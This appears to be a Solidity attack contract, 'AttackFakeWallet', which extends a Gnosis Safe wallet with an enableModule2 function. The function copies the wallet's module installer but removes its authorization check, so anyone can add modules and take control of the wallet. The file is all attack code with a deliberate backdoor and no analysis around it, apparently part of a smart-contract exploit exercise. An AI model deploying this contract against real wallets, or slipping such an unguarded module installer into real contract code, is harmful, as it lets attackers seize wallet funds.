// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract AttackFakeWallet is GnosisSafe {
    // A module installer identical to the GnosisSafe Module Manager enableModule()
    // except for the fact that this allows ANYONE to install modules.
    function enableModule2(address module) public {
        // Module address cannot be null or sentinel.
        require(module != address(0) && module != SENTINEL_MODULES, "GS101");
        // Module cannot be added twice.
        require(modules[module] == address(0), "GS102");
        modules[module] = modules[SENTINEL_MODULES];
        modules[SENTINEL_MODULES] = module;
    }
}
